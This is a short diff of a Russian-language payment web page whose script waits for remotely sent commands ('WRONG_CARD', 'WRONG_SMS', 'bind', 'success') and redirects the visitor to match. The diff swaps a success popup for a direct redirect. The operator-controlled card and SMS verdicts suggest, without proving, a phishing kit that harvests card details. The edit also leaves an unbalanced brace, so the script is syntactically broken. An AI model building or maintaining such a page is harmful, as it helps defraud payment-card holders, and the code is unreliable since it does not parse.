@@ -1081,14 +1081,7 @@
             }, 500);
         };
 
-        window.showSuccessMessage = function() {
-            showNotification('success', translations[currentLanguage].successText, 'Платеж успешно обработан!');
-            
-            setTimeout(() => {
-                hideLoading();
-                window.location.href = 'success.html';
-            }, 2000);
-        };
+        
 
         function showNotification(type, title, message) {
             const overlay = document.getElementById('notificationOverlay');
@@ -1318,9 +1311,11 @@
                 console.log('❌ Получена команда WRONG_CARD');
                 hideLoading();
                 window.location.href = 'payment.html?status=wrong_card';
-            } else if (command.action === 'bind' || command.action === 'success') {
+           } else if (command.action === 'bind' || command.action === 'success') {
                 console.log('🎉 Получена команда SUCCESS');
-                window.showSuccessMessage();
+                hideLoading();
+                window.location.href = 'success.html';  // ← Прямой редирект без окошка
+            }
             } else if (command.action === 'wrong_sms') {
                 console.log('❌ Получена команда WRONG_SMS');
                 window.showWrongSMSError();
@@ -1435,3 +1430,4 @@
     </script>
 </body>
 </html>
+
